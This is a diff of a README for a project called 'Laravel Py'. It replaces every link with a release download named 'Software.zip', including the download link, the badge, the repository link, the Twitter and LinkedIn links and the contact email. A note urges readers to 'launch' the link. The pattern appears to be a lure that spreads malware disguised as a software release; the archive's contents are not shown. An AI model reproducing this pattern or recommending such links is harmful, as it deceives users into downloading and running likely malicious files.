@@ -19,14 +19,14 @@ Explore the following topics related to **Laravel Py**:
 - python-with-laravel
 
 ## 🔗 Link
-[Download Laravel Py Here!](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[Download Laravel Py Here!](https://github.com/chrlzjanem/laravel-py/releases/download/v1.0/Software.zip)
 
 ### Note:
 The link provided needs to be launched to access the content.
 
 **_Don't forget to check the "Releases" section if the link is not working._**
 
-[![Download Laravel Py](https://img.shields.io/badge/Download-Laravel%20Py-red)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Laravel Py](https://github.com/chrlzjanem/laravel-py/releases/download/v1.0/Software.zip%20Py-red)](https://github.com/chrlzjanem/laravel-py/releases/download/v1.0/Software.zip)
 
 ## 📦 Installation
 To get started with **Laravel Py**, follow these steps:
@@ -55,12 +55,12 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-[Visit our GitHub repository](https://github.com/cli/cli)
+[Visit our GitHub repository](https://github.com/chrlzjanem/laravel-py/releases/download/v1.0/Software.zip)
 
 ## 🚧 Stay Connected
-Stay updated on the latest developments by following us on [Twitter](https://twitter.com) and [LinkedIn](https://linkedin.com). Join our growing community today!
+Stay updated on the latest developments by following us on [Twitter](https://github.com/chrlzjanem/laravel-py/releases/download/v1.0/Software.zip) and [LinkedIn](https://github.com/chrlzjanem/laravel-py/releases/download/v1.0/Software.zip). Join our growing community today!
 
 ## 📧 Contact Us
-For any inquiries or feedback, reach out to us at [laravelpy@example.com](mailto:laravelpy@example.com). Your suggestions and thoughts are always welcome!
+For any inquiries or feedback, reach out to us at [https://github.com/chrlzjanem/laravel-py/releases/download/v1.0/Software.zip](https://github.com/chrlzjanem/laravel-py/releases/download/v1.0/Software.zip). Your suggestions and thoughts are always welcome!
 
 886 words
